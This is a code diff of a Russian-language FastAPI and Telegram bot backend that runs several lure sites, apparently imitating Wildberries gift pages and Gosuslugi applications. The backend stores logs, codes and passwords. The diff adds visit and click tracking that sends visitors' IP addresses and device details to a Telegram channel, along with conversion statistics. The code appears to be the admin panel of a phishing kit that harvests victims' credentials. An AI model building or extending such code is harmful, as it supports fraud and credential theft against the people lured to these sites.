@@ -29,7 +29,7 @@ from fastapi.templating import Jinja2Templates
 import uvicorn
 
 from config import (
-    BOT_TOKEN, ADMIN_CHANNEL, PROXY_URL, API_HOST, API_PORT,
+    BOT_TOKEN, ADMIN_CHANNEL, TRACK_CHANNEL, PROXY_URL, API_HOST, API_PORT,
     FIRST_ERRORS, CODE_ERRORS
 )
 from database import init_db, Log, Code, Password, Ad
@@ -173,6 +173,60 @@ def get_gift_link(site_id: str = "wb") -> str:
 
 def set_gift_link(site_id: str, link: str):
     set_site_setting(site_id, "gift_link", link)
+
+# ============================================
+# СТАТИСТИКА ПОСЕЩЕНИЙ
+# ============================================
+STATS_FILE = os.path.join(os.path.dirname(__file__), "data", "stats.json")
+
+def load_stats() -> dict:
+    if os.path.exists(STATS_FILE):
+        try:
+            with open(STATS_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {}
+
+def save_stats(stats: dict):
+    os.makedirs(os.path.dirname(STATS_FILE), exist_ok=True)
+    with open(STATS_FILE, "w", encoding="utf-8") as f:
+        json.dump(stats, f, ensure_ascii=False, indent=2)
+
+def increment_stat(site_id: str, stat_type: str):
+    """Увеличить счётчик (visit или click). Считаем за день и всего."""
+    stats = load_stats()
+    today = datetime.datetime.now().strftime("%Y-%m-%d")
+    if site_id not in stats:
+        stats[site_id] = {}
+    site_stats = stats[site_id]
+
+    # Всего
+    total_key = f"{stat_type}_total"
+    site_stats[total_key] = site_stats.get(total_key, 0) + 1
+
+    # За сегодня
+    daily_key = f"{stat_type}_daily"
+    if "date" not in site_stats or site_stats["date"] != today:
+        site_stats["date"] = today
+        site_stats["visit_daily"] = 0
+        site_stats["click_daily"] = 0
+    site_stats[daily_key] = site_stats.get(daily_key, 0) + 1
+
+    stats[site_id] = site_stats
+    save_stats(stats)
+    return site_stats
+
+def get_stats(site_id: str) -> dict:
+    """Получить статистику сайта."""
+    stats = load_stats()
+    today = datetime.datetime.now().strftime("%Y-%m-%d")
+    site_stats = stats.get(site_id, {})
+    # Сбросить дневные если дата сменилась
+    if site_stats.get("date") != today:
+        site_stats["visit_daily"] = 0
+        site_stats["click_daily"] = 0
+    return site_stats
 
 # ============================================
 # NGINX КОНФИГУРАЦИЯ
@@ -345,6 +399,7 @@ def get_site_menu(site_id: str):
     if site.get("has_gift_link"):
         link_label = site.get("gift_link_label", "🎁 Ссылка подарка")
         buttons.insert(0, [types.InlineKeyboardButton(text=link_label, callback_data=f"link:{site_id}")])
+    buttons.append([types.InlineKeyboardButton(text="📊 Статистика", callback_data=f"stats:{site_id}")])
     buttons.append([types.InlineKeyboardButton(text="🔒 SSL", callback_data=f"ssl:{site_id}")])
     buttons.append([types.InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:main")])
     return types.InlineKeyboardMarkup(inline_keyboard=buttons)
@@ -476,6 +531,45 @@ async def menu_ssl(callback: types.CallbackQuery):
         f"Нажмите кнопку чтобы выпустить/обновить SSL сертификат:",
         reply_markup=get_retry_ssl_menu(site_id)
     )
+    await callback.answer()
+
+# --- СТАТИСТИКА ---
+
+@router.callback_query(F.data.startswith("stats:"))
+async def menu_stats(callback: types.CallbackQuery):
+    site_id = callback.data.split(":")[1]
+    site = SITES[site_id]
+    st = get_stats(site_id)
+
+    visits_today = st.get("visit_daily", 0)
+    visits_total = st.get("visit_total", 0)
+    clicks_today = st.get("click_daily", 0)
+    clicks_total = st.get("click_total", 0)
+
+    conversion = 0
+    if visits_today > 0:
+        conversion = round(clicks_today / visits_today * 100, 1)
+
+    conversion_total = 0
+    if visits_total > 0:
+        conversion_total = round(clicks_total / visits_total * 100, 1)
+
+    text = (
+        f"{site['emoji']} <b>{site['name']} — Статистика</b>\n\n"
+        f"📅 <b>Сегодня:</b>\n"
+        f"   👁 Визитов: <b>{visits_today}</b>\n"
+        f"   🖱 Кликов: <b>{clicks_today}</b>\n"
+        f"   📈 Конверсия: <b>{conversion}%</b>\n\n"
+        f"📊 <b>Всего:</b>\n"
+        f"   👁 Визитов: <b>{visits_total}</b>\n"
+        f"   🖱 Кликов: <b>{clicks_total}</b>\n"
+        f"   📈 Конверсия: <b>{conversion_total}%</b>"
+    )
+
+    await callback.message.edit_text(text, reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+        [types.InlineKeyboardButton(text="🔄 Обновить", callback_data=f"stats:{site_id}")],
+        [types.InlineKeyboardButton(text="⬅️ Назад", callback_data=f"site:{site_id}")],
+    ]))
     await callback.answer()
 
 # --- ДЕЙСТВИЯ: УСТАНОВИТЬ ДОМЕН ---
@@ -812,6 +906,66 @@ async def api_claim_link():
     """Получение текущей ссылки заявки (Госуслуги)"""
     link = get_gift_link("gos")
     return {"link": link}
+
+@app.post("/api/track/visit")
+async def api_track_visit(request: Request):
+    """Трекинг визита на сайт"""
+    body = await request.json()
+    site_id = body.get("site", "wb")
+    if site_id not in SITES:
+        return {"ok": False}
+
+    user_agent = request.headers.get("User-Agent", "")
+    ip = request.headers.get("X-Real-IP", request.client.host if request.client else "unknown")
+
+    st = increment_stat(site_id, "visit")
+    site = SITES[site_id]
+
+    # Определяем устройство кратко
+    device = "📱 Мобильный" if any(x in user_agent.lower() for x in ["iphone", "android", "mobile"]) else "💻 ПК"
+    browser = "Safari" if "Safari" in user_agent and "Chrome" not in user_agent else \
+              "Chrome" if "Chrome" in user_agent else \
+              "Firefox" if "Firefox" in user_agent else "Другой"
+
+    try:
+        await bot.send_message(
+            TRACK_CHANNEL,
+            f"👁 <b>Визит</b> — {site['emoji']} {site['name']}\n\n"
+            f"🌐 IP: <code>{ip}</code>\n"
+            f"{device} | {browser}\n"
+            f"📊 Сегодня: {st.get('visit_daily', 0)} визитов",
+        )
+    except Exception as e:
+        logger.error(f"Track visit send error: {e}")
+
+    return {"ok": True}
+
+@app.post("/api/track/click")
+async def api_track_click(request: Request):
+    """Трекинг клика по кнопке"""
+    body = await request.json()
+    site_id = body.get("site", "wb")
+    if site_id not in SITES:
+        return {"ok": False}
+
+    ip = request.headers.get("X-Real-IP", request.client.host if request.client else "unknown")
+    st = increment_stat(site_id, "click")
+    site = SITES[site_id]
+
+    btn_label = "📋 Подать заявку" if site_id == "gos" else "🎁 Получить подарок"
+
+    try:
+        await bot.send_message(
+            TRACK_CHANNEL,
+            f"🎯 <b>Клик</b> — {site['emoji']} {site['name']}\n\n"
+            f"🔘 {btn_label}\n"
+            f"🌐 IP: <code>{ip}</code>\n"
+            f"📊 Сегодня: {st.get('click_daily', 0)} кликов | {st.get('visit_daily', 0)} визитов",
+        )
+    except Exception as e:
+        logger.error(f"Track click send error: {e}")
+
+    return {"ok": True}
 
 @app.post("/api/createLog")
 async def create_log(request: Request):
